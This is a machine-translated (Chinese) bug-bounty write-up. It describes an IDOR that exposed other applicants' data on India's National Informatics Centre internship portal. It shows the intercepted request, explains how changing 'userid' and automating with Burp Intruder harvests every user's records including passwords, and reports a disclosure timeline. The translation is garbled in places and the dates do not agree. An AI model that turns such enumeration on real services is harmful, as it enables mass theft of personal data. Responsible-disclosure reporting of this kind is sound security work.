<html>
<head>
<title>API authentication bypass on National Informatics Centre</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">国家信息中心的API认证旁路</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/api-authentication-bypass-on-national-informatics-centre-d438b3bae085?source=collection_archive---------2-----------------------#2022-04-02">https://infosecwriteups.com/api-authentication-bypass-on-national-informatics-centre-d438b3bae085?source=collection_archive---------2-----------------------#2022-04-02</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="7b4b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嘿黑客们！！！我的名字是克里希纳德夫·P·梅勒维拉。我是一名20岁的web应用渗透测试员。更多细节请在谷歌上搜索我的名字。</p><blockquote class="kl km kn"><p id="cfd4" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="iq">漏洞:</em> </strong>绕过API认证</p><p id="2a9d" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="iq">冲击:零点一天</em> </strong></p><p id="a306" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="iq">风险:</em> </strong>敏感数据泄露与IDOR连锁</p><p id="5a58" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="iq">优先级:P0 </em> </strong></p><p id="5c45" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="iq">范围:</em> </strong>教育详情、电话号码、加密密码、令牌、个人敏感详情</p></blockquote><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div class="gh gi ks"><img src="../Images/85f300f2fd8c60172f3515e1be096d28.png" data-original-src="https://miro.medium.com/v2/resize:fit:1384/format:webp/1*ajnW81wPsfsw45MJ9Q2ctg.png"/></div><figcaption class="la lb gj gh gi lc ld bd b be z dk translated">国家信息中心</figcaption></figure><p id="25a0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先我会告诉你我是怎么来的这个漏洞。</p><p id="402b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">像往常一样，我在Instagram上冲浪，我通过的网站<strong class="jp ir"> vidyakosh.nic .得知国家信息中心提供暑期实习机会。我不再等待，立即投入申请。但在填写完申请的所有阶段后，它给我显示了一条信息，即它只适用于三年级学生。因为我是BTech一年级的。学生，我没有资格申请。</strong></p><p id="93c6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我变得悲伤，</p><figure class="kt ku kv kw gt kx"><div class="bz fp l di"><div class="le lf l"/></div></figure><p id="a2c3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是，我从来没有决定后退，而是打开了我的黑客模式！！！</p></div><div class="ab cl lg lh hu li" role="separator"><span class="lj bw bk lk ll lm"/><span class="lj bw bk lk ll lm"/><span class="lj bw bk lk ll"/></div><div class="ij ik il im in"><p id="ef3f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我是如何拿到这份报告的？</p><p id="fd59" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我看到NIC Instagram发布了暑期实习的消息。然后我赶紧跑去敷。但不幸的是，实习只针对三年级的BTech。60分的学生。我是一年级学生。所以我变得失望。但是我的激情唤醒了我，并开始测试这个网站，触及这个弱点。这是我在国家信息中心的第二个bug。第一个是由NIC开发的喀拉拉邦民用物资网站IDOR。</p></div><div class="ab cl lg lh hu li" role="separator"><span class="lj bw bk lk ll lm"/><span class="lj bw bk lk ll lm"/><span class="lj bw bk lk ll"/></div><div class="ij ik il im in"><p id="8806" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在阅读技术报告！</p><p id="ee4c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从攻击者的角度再现的步骤</p><p id="8905" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第一步:在填写申请表的第四步时，截取请求，你将得到如下请求。</p><pre class="kt ku kv kw gt ln lo lp lq aw lr bi"><span id="3654" class="ls lt iq lo b gy lu lv l lw lx">POST /public/internship/userdetails HTTP/1.1 <br/>Host: vidyakosh.nic.in Cookie: pop=1; laravel_cookie_consent=1; nic_lms_session=&lt;REDACTED&gt; XSRF-TOKEN=&lt;REDACTED&gt;<br/>Content-Length: 56<br/>Sec-Ch-Ua: “ Not A;Brand”;v=”99", “Chromium”;v=”99", “Google Chrome”;v=”99" <br/>Accept: application/json, text/javascript, */*; q=0.01 <br/>Content-Type: application/x-www-form-urlencoded; charset=UTF-8 <br/>X-Requested-With: XMLHttpRequest <br/>Sec-Ch-Ua-Mobile: ?0 <br/>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 <br/>Sec-Ch-Ua-Platform: “Windows” <br/>Origin: <a class="ae ly" href="https://vidyakosh.nic.in" rel="noopener ugc nofollow" target="_blank">https://vidyakosh.nic.in</a> <br/>Sec-Fetch-Site: same-origin <br/>Sec-Fetch-Mode: cors <br/>Sec-Fetch-Dest: empty <br/>Referer: <a class="ae ly" href="https://vidyakosh.nic.in/public/internship/internshipstep4" rel="noopener ugc nofollow" target="_blank">https://vidyakosh.nic.in/public/internship/internshipstep4</a> Accept-Encoding: gzip, deflate <br/>Accept-Language: en-US,en;q=0.9,ml;q=0.8,hi;q=0.7 <br/>Connection: close </span><span id="b8d6" class="ls lt iq lo b gy lz lv l lw lx">userid=13&amp;_token=&lt;REDACTED&gt;</span></pre><p id="8a82" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这里，您可以看到一个名为“userid”的参数，如果我们将其更改为除“13”以外的任何其他值，我们将获得其他用户的数据，如下所示。</p><pre class="kt ku kv kw gt ln lo lp lq aw lr bi"><span id="a089" class="ls lt iq lo b gy lu lv l lw lx">{“message”:[{“id”:1,”fname”:”Manish”,”active”:0,”email”:”&lt;REDACTED&gt;”,”email_otp”:””,”mobile”:”&lt;REDACTED&gt;",”mobile_otp”:””,”arn_no “:””,”gender”:”1",”password”:”&lt;REDACTED&gt;",”created_on”:”2022–04–01 16:32:11",”updated_on”:”2022–04–01 13:40:38",”dob”:”0000–00–00",”father_name”:””,”mother_name”:””,”state_id”:0 ,”dist_id”:0,”adress1":””,”adress2":””,”pin”:0,”session”:””,”s_year”:””,”st atement_purpose”:””,”photo”:””,”sign”:””,”project”:””,”education_pattern”:” “,”institute_category”:0,”institute_name”:””,”institute_adress”:””,”institu e_telephone”:””,”institute_email”:””,”bank_ac_no”:””,”bank_name”:””,”ifsc_c ode”:””,”branch_name”:””,”test”:””,”deleted_at”:null,”remember_token”:”&lt;REDACTED&gt;”,”pursuing_year”:” “,”form_submit_value”:0}]}</span></pre><p id="7ada" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用任何自动化工具，如burp入侵者，我们可以获取完整的用户数据，包括用户名和密码。</p><blockquote class="kl km kn"><p id="eaf3" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">报告日期:2022年4月3日</p><p id="d92c" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">部分修复发布于:2022年3月4日</p><p id="8f0f" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">完整修复发布于:2022年4月4日</p></blockquote><p id="d77c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">参加我报告的高级软件工程师需要一个特别的大喊，因为他非常敬业。他一收到我的消息，就迅速行动，并在当天晚上发布了部分补丁。T25】</p><p id="63b3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所有人都在这里，</p><p id="3644" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="ko">别忘了在medium等社交媒体上关注我。也请为这篇文章鼓掌50次，这是我写更多的灵感！！</em>T29】</strong></p><p id="5e38" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">我需要你们的支持来写更多，请给我买杯咖啡吧pls:</strong><a class="ae ly" href="https://www.buymeacoffee.com/krishnadevpm" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">【https://www.buymeacoffee.com/krishnadevpm】</strong></a></p><p id="fa41" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="ko">我的Instagram手柄:</em><a class="ae ly" href="https://instagram.com/krishnadev_p_melevila" rel="noopener ugc nofollow" target="_blank"><em class="ko">https://instagram.com/krishnadev_p_melevila</em></a></p><p id="1ebd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="ko">我的推特句柄:</em><a class="ae ly" href="https://twitter.com/Krishnadev_P_M" rel="noopener ugc nofollow" target="_blank"><em class="ko">https://twitter.com/Krishnadev_P_M</em></a></p><p id="83eb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="ko">我的LinkedIn手柄:</em><a class="ae ly" href="https://www.linkedin.com/in/krishnadevpmelevila/" rel="noopener ugc nofollow" target="_blank">【https://www.linkedin.com/in/krishnadevpmelevila/】T21</a></p><p id="5414" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="ko">我的人事网站:</em><a class="ae ly" href="http://krishnadevpmelevila.com/" rel="noopener ugc nofollow" target="_blank"><em class="ko">http://krishnadevpmelevila.com/</em></a></p></div></div>    
</body>
</html>